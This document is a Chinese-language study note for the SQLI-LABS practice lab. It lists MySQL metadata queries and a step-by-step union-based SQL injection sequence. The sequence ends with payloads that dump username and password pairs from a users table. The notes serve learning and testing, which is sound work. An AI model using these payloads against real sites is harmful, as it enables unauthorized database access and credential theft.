---
title: SQLI-LABS
date: 2021-11-24 01:55:24
tags:
---

# CRUD
- 查库：`SELECT schema_name FROM information_schema.schemata`
- 查表：`SELECT table_name FROM information_schema.tables WHERE table_schema='security'`
- 查列：`SELECT column_name FROM information_schema.columns WHERE table_name='users'`
- 查字段：`SELECT username, password FROM security.users`

# 一些函数
- SELECT SYSTEM_USER();
- SELECT USER();
- SELECT DATABASE();
- SELECT VERSION();
- SELECT @@datadir;	-- 查看 mysql 路径
- SELECT @@version_compile_os;	-- 查看版本

# 注入
1. 查看是否有注入：  
`?id=1'`
2. 查看有多少列：  
`?id=1' ORDER BY 10 --+`
3. 查看哪些数据可以回显：  
`?id=-1' UNION SELECT 1,2,3 --+`
4. 查看当前数据库：  
`?id=-1' UNION SELECT 1,2,DATABASE() --+`
5. 查看数据库：
- 显示下标为2开始后的1位数据  
`?id=-1' UNION SELECT 1,2,schema_name FROM information_schema.schemata LIMIT 2,1 --+`
- 在第三列显示所有数据库名  
`?id=-1' UNION SELECT 1,2,GROUP_CONCAT(SCHEMA_NAME) FROM information_schema.schemata --+`
6. 查表
- 手动筛选  
`?id=-1' UNION SELECT 1,2,table_name FROM information_schema.tables WHERE table_schema='security' LIMIT 0,1 --+`
- 显示所有  
`?id=-1' UNION SELECT 1,2,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='security' --+`
7. 查列
- `?id=1' UNION SELECT 1,2,column_name FROM information_schema.columns WHERE table_schema='security' --+`  
- `?id=1' UNION SELECT 1,2,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='security' --+`
8. 查数据
- `?id=-1' UNION SELECT 1,2,CONCAT_WS('~', username, password) FROM security.users LIMIT 0,1 --+`  
- `?id=-1' UNION SELECT 1,2,GROUP_CONCAT(CONCAT_WS('~', username, password)) FROM security.users --+`